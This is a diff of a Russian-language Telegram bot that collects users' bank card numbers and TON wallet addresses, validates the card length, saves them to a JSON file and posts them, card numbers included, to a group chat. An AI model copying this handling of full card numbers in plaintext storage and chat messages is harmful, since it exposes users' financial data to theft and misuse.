 async def save_card(message: types.Message, state: FSMContext):
     card_number = message.text.strip()
+    # Удаляем пробелы, если есть
+    card_number = card_number.replace(" ", "")
+    if not card_number.isdigit():
+        await message.answer("❌ Номер карты должен содержать только цифры")
+        return
+    if len(card_number) not in (16, 18):
+        await message.answer("❌ Длина номера карты должна быть 16 или 18 цифр")
+        return
+
     user_id = str(message.from_user.id)
-    try :
-        card_number = int(card_number)
-        card_numberlen = len(str(card_number))
-        if card_numberlen == 16:
-            data = load_data()
-            if user_id not in data:
-                data[user_id] = {"ton_wallet": "", "card": ""}
+    data = load_data()
+    if user_id not in data:
+        data[user_id] = {"ton_wallet": "", "card": ""}
+    data[user_id]["card"] = card_number
+    save_data(data)
 
-            data[user_id]["card"] = card_number
-            save_data(data)
+    await message.answer(f"✅ Карта сохранена: {card_number}")
+    await state.clear()
 
-            await message.answer(f"✅ Карта сохранена: {card_number}")
-            await state.clear()
+    user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
+    ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
+    card = user_data.get("card", "Не указана") or "Не указана"
 
-            user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
-            ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
-            card = user_data.get("card", "Не указана") or "Не указана"
+    await bot.send_message(GROUP_ID, f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")
 
-            await bot.send_message(GROUP_ID,
-                                   f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")
+    await message.answer_photo(
+        photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
+        caption=
+        f"📋 Ваши реквизиты:\n\n"
+        f"⭐Username для звёзд: @{message.from_user.username}\n"
+        f"👛 TON: {ton}\n"
+        f"💳 Карта: {card}",
+        reply_markup=requisites_keyboard
+    )
 
-            await message.answer_photo(
-                photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
-                caption=
-                f"📋 Ваши реквизиты:\n\n"
-                f"⭐Username для звёзд: @{message.from_user.username}\n"
-                f"👛 TON: {ton}\n"
-                f"💳 Карта: {card}",
-                reply_markup=requisites_keyboard)
-        elif card_numberlen == 18:
-            data = load_data()
-            if user_id not in data:
-                data[user_id] = {"ton_wallet": "", "card": ""}
-
-            data[user_id]["card"] = card_number
-            save_data(data)
-
-            await message.answer(f"✅ Карта сохранена: {card_number}")
-            await state.clear()
-
-            user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
-            ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
-            card = user_data.get("card", "Не указана") or "Не указана"
-
-            await bot.send_message(GROUP_ID,
-                                   f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")
-
-            await message.answer_photo(
-                photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
-                caption=
-                f"📋 Ваши реквизиты:\n\n"
-                f"⭐Username для звёзд: @{message.from_user.username}\n"
-                f"👛 TON: {ton}\n"
-                f"💳 Карта: {card}",
-                reply_markup=requisites_keyboard)
-        else:
-            await message.answer("‼Длинна должна составлять 16/18 символов‼")
-    except ValueError:
-        await message.answer("❌Введите карту используя числа/цифры")
-
+# ========== БАЛАНС ==========
 
 @router.callback_query(F.data == "balance")
 async def show_balance(callback: CallbackQuery):
@@ -1009,17 +842,20 @@ async def show_balance(callback: CallbackQuery):
         reply_markup=back_keyboard
     )
 
-
 @router.callback_query(F.data == "back")
 async def go_back(callback: CallbackQuery, state: FSMContext):
     await state.clear()
-    photo_url = "https://iimg.su/i/WGjaUa"
+    photo_url = "https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg"
     await callback.message.answer_photo(
         photo=photo_url,
         caption="Главное меню:",
         reply_markup=inline_kb
     )
     await callback.answer()
+
+
+# ========== ПОДКЛЮЧЕНИЕ РОУТЕРА (ВАЖНО: после всех хендлеров!) ==========
+dp.include_router(router)
 
 
 # ========== ЗАПУСК БОТА ==========
@@ -1031,20 +867,17 @@ async def main():
     logger.info("=" * 50)
 
     # Проверяем файлы
-    for filename in [DATA_FILE, DEALS_FILE]:
+    for filename in [DATA_FILE, DEALS_FILE, ADMINS_FILE]:
         if not os.path.exists(filename):
             with open(filename, 'w', encoding='utf-8') as f:
                 json.dump({}, f, ensure_ascii=False, indent=2)
+            logger.info(f"Создан пустой файл {filename}")
 
     logger.info("Бот запущен!")
     await dp.start_polling(bot)
-
 
 if __name__ == "__main__":
     print(f"🤖 Бот: @{BOT_USERNAME}")
     print(f"🛡️  Поддержка: @{SUPPORT_USERNAME}")
     print("=" * 40)
-
     asyncio.run(main())
-
-
